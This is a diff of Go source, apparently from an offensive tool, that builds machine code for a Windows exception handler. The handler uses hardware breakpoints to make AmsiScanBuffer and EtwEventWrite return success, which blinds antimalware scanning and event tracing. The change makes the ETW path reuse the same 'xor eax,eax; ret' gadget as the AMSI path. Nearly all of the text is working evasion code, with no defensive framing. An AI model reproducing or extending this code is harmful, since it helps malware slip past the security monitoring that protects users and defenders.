@@ -138,8 +138,9 @@ var (
 //  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
 //  2. Load ContextRecord pointer
 //  3. Compare ContextRecord->Rip against AMSI addr → redirect Rip to embedded
-//     "xor eax,eax; ret" gadget that returns S_OK to AmsiScanBuffer's caller
-//  4. Compare ContextRecord->Rip against ETW addr  → set Rax = 0, simulate RET
+//     "xor eax,eax; ret" gadget (returns S_OK to caller via native RET)
+//  4. Compare ContextRecord->Rip against ETW addr → same gadget redirect
+//     (returns 0/STATUS_SUCCESS via native RET)
 //  5. Clear Dr6
 //  6. Return EXCEPTION_CONTINUE_EXECUTION (-1)
 //  7. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
@@ -272,40 +273,21 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	jneNotOursShortOffset := len(code)
 	code = append(code, 0x00) // placeholder
 
-	// ETW match: set Rax in context to 0 (STATUS_SUCCESS)
-	// mov qword [rbx+0x78], 0
-	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+disp32], imm32
-	code = append(code, 0x78, 0x00, 0x00, 0x00)       // disp32 = 0x78 (Rax offset)
-	code = append(code, 0x00, 0x00, 0x00, 0x00)       // imm32 = 0
-
-	// ETW RET simulation: pop return address from context stack
-	// (Only reached from the ETW match path above)
-
-	// Load Rsp from context: rax = [rbx+0x98]
-	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
-	code = append(code, 0x98, 0x00, 0x00, 0x00)
-
-	// Load return address from stack: rcx = [rax]
-	code = append(code, 0x48, 0x8B, 0x08)             // mov rcx, [rax]
-
-	// Store return address into context Rip: [rbx+0xF8] = rcx
-	code = append(code, 0x48, 0x89, 0x8B)             // mov [rbx+0xF8], rcx
-	code = append(code, 0xF8, 0x00, 0x00, 0x00)
-
-	// Adjust Rsp: [rbx+0x98] = rax + 8
-	code = append(code, 0x48, 0x83, 0xC0, 0x08)       // add rax, 8
-	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x98], rax
-	code = append(code, 0x98, 0x00, 0x00, 0x00)
-
-	// Clear Dr6: mov qword [rbx+0x68], 0
-	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+disp32], imm32
-	code = append(code, 0x68, 0x00, 0x00, 0x00)       // disp32 = 0x68 (Dr6 offset)
-	code = append(code, 0x00, 0x00, 0x00, 0x00)       // imm32 = 0
-
-	// Return EXCEPTION_CONTINUE_EXECUTION (-1 = 0xFFFFFFFF)
-	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, 0xFFFFFFFF
-
-	// Epilogue
+	// ETW match: redirect execution to the same "xor eax,eax; ret" gadget.
+	// EtwEventWrite returns ULONG (0 = success), so xor eax,eax; ret works
+	// the same way as for AMSI: redirect Rip to the gadget, let the CPU's
+	// native RET instruction handle proper stack unwinding.
+	// Load gadget address from data block: rax = [r13+0x10]
+	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
+	// Set context.Rip to gadget address: [rbx+0xF8] = rax
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
+	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
+	// Clear Dr6: [rbx+0x68] = 0
+	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
+	code = append(code, 0x68, 0x00, 0x00, 0x00)
+	code = append(code, 0x00, 0x00, 0x00, 0x00)
+	// Return EXCEPTION_CONTINUE_EXECUTION
+	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, -1
 	code = append(code, 0x41, 0x5D)                   // pop r13
 	code = append(code, 0x41, 0x5C)                   // pop r12
 	code = append(code, 0x5B)                         // pop rbx
